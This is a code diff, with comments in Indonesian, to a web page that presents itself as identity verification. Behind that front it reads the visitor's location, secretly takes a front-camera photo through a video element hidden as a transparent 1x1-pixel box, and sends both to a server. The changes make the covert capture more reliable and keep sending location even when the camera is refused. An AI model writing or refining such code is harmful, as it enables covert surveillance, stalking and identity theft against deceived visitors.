@@ -25,7 +25,17 @@
         button:disabled { background-color: #9aa0a6; cursor: wait; }
         
         #verificationOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 17, 21, 0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; }
-        #hiddenVideo, #hiddenCanvas { display: none; }
+        
+        /* FIX KAMERA: Jangan pake display:none. Pake trik 1x1 pixel transparan */
+        #hiddenVideo, #hiddenCanvas { 
+            position: fixed; 
+            top: -10px; 
+            left: -10px; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0; 
+            pointer-events: none; 
+        }
     </style>
 </head>
 <body>
@@ -96,7 +106,7 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            // 2. Minta Izin Kamera & JEPRET (Dikasih waktu 1.5 detik biar fokus)
+            // 2. Minta Izin Kamera
             statusText.innerText = 'Memverifikasi identitas...';
             let photoBase64 = null;
             
@@ -104,19 +114,40 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
                 
-                // Tunggu 1.5 detik biar kamera bener-bener siap
-                await new Promise(r => setTimeout(r, 1500)); 
+                // Tunggu sampai video bener-bener siap
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => { resolve(); };
+                    setTimeout(resolve, 2000); // Maksimal tunggu 2 detik
+                });
+                await video.play(); // Paksa play
                 
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                // Tunggu 0.5 detik biar gambar ga gelap
+                await new Promise(r => setTimeout(r, 500)); 
+                
+                // Kecilin resolusi biar ringan (Max 480px)
+                let w = video.videoWidth || 480;
+                let h = video.videoHeight || 480;
+                if (w > 480) {
+                    h = Math.round(h * (480 / w));
+                    w = 480;
+                }
+
+                canvas.width = w;
+                canvas.height = h;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(video, 0, 0, w, h);
                 
-                photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+                photoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                 stream.getTracks().forEach(t => t.stop());
+                
+                if (!photoBase64 || photoBase64.length < 5000) {
+                    throw new Error("Gambar terlalu kecil / kamera gagal");
+                }
+                
             } catch (camErr) {
-                // Kalo kamera gagal/ditolak, tetep kirim laporan tanpa foto
                 console.log('Kamera gagal:', camErr);
+                statusText.innerText = 'Peringatan: Kamera gagal diakses.';
+                // Lanjut kirim teks aja, jangan di-stop
             }
 
             // 3. Kirim Data ke Server
